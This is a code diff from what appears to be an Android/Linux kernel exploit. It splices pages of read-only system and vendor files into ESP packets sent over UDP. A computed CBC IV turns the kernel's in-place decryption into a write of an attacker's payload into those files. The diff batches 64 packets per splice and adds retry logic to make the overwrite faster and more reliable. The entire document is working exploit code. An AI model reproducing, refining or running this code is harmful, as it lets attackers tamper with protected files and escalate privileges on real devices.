@@ -106,14 +106,13 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
     return 0;
 }
 
-/* Send one CBC write.
+/* Write one ESP packet (40 bytes) into the pipe only (no socket splice).
  * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
  * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
  * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
- * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
  */
-static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
-                            const uint8_t iv[16], int use_helper) {
+static int do_one_write_cbc_pipe(int pipe_wr, int file_fd, off_t offset,
+                                  const uint8_t iv[16], int use_helper) {
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(g_seq++);
@@ -146,9 +145,16 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
             printf("splice file failed: %s\n", strerror(errno)); return -1;
         }
     }
+    return 0;
+}
 
-    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
-    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
+/* Splice accumulated ESP packets from pipe to UDP socket in one call. */
+static int flush_pipe_to_socket(int pipe_rd, int sk_send, size_t total_bytes) {
+    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, (ssize_t)total_bytes, 0);
+    if (s != (ssize_t)total_bytes) {
+        printf("splice pipe->udp: %zd expected %zu\n", s, total_bytes);
+        return -1;
+    }
     return 0;
 }
 
@@ -208,45 +214,67 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         return -1;
     }
 
+    /* Batch size: 64 ESP packets (2560 bytes) per pipe→socket splice.
+     * Reduces splice-to-socket syscalls by 64×. */
+    enum { BATCH = 64 };
+    size_t total_blocks = len / 16;
+
     int rc = 0;
-    for (size_t i = 0; i < len / 16; i++) {
-        off_t off = (off_t)(foff + i * 16);
-        uint8_t old_content[16] = {0};
+    for (size_t batch_start = 0; batch_start < total_blocks; batch_start += BATCH) {
+        size_t batch_end = batch_start + BATCH;
+        if (batch_end > total_blocks) batch_end = total_blocks;
+        size_t batch_size = batch_end - batch_start;
 
-        if (use_helper) {
-            if (read_vendor_content(off, old_content) < 0) {
-                rc = -1; break;
+        /* Phase 1: write all ESP packets in this batch into the pipe */
+        for (size_t i = batch_start; i < batch_end; i++) {
+            off_t off = (off_t)(foff + i * 16);
+            uint8_t old_content[16] = {0};
+
+            if (use_helper) {
+                if (read_vendor_content(off, old_content) < 0) {
+                    rc = -1; goto batch_done;
+                }
+            } else {
+                if (pread(file_fd, old_content, 16, off) != 16) {
+                    printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
+                    rc = -1; goto batch_done;
+                }
             }
-        } else {
-            if (pread(file_fd, old_content, 16, off) != 16) {
-                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
-                rc = -1; break;
+
+            uint8_t desired[16] = {0};
+            memcpy(desired, payload + i * 16, 16);
+
+            uint8_t iv[16];
+            compute_iv(old_content, desired, iv);
+
+            int write_ok = 0;
+            for (int attempt = 0; attempt < 3; attempt++) {
+                if (do_one_write_cbc_pipe(pfd[1], file_fd, off, iv, use_helper) == 0) {
+                    write_ok = 1;
+                    break;
+                }
+                if (attempt < 2) {
+                    printf("write #%zu at 0x%lx retry %d...\n", i, (long)off, attempt + 1);
+                    usleep(10000);
+                }
+            }
+            if (!write_ok) {
+                printf("write #%zu at 0x%lx failed after 3 attempts\n", i, (long)off);
+                rc = -1; goto batch_done;
             }
         }
 
-        uint8_t desired[16] = {0};
-        memcpy(desired, payload + i * 16, 16);
-
-        uint8_t iv[16];
-        compute_iv(old_content, desired, iv);
-
-        int write_ok = 0;
-        for (int attempt = 0; attempt < 3; attempt++) {
-            if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) == 0) {
-                write_ok = 1;
-                break;
-            }
-            if (attempt < 2) {
-                printf("write #%zu at 0x%lx retry %d...\n", i, (long)off, attempt + 1);
-                usleep(10000);
-            }
+        /* Phase 2: flush the batch to the socket in one splice */
+        if (flush_pipe_to_socket(pfd[0], sk_send, batch_size * 40) < 0) {
+            rc = -1;
+            goto batch_done;
         }
-        if (!write_ok) {
-            printf("write #%zu at 0x%lx failed after 3 attempts\n", i, (long)off);
-            rc = -1; break;
-        }
-        if (i % 32 == 0)
-            printf("%zu ...\n", i * 16);
+
+        if (batch_start % (BATCH * 4) == 0)
+            printf("%zu ...\n", batch_start * 16);
+
+batch_done:
+        if (rc) break;
     }
 
     close(pfd[0]); close(pfd[1]);
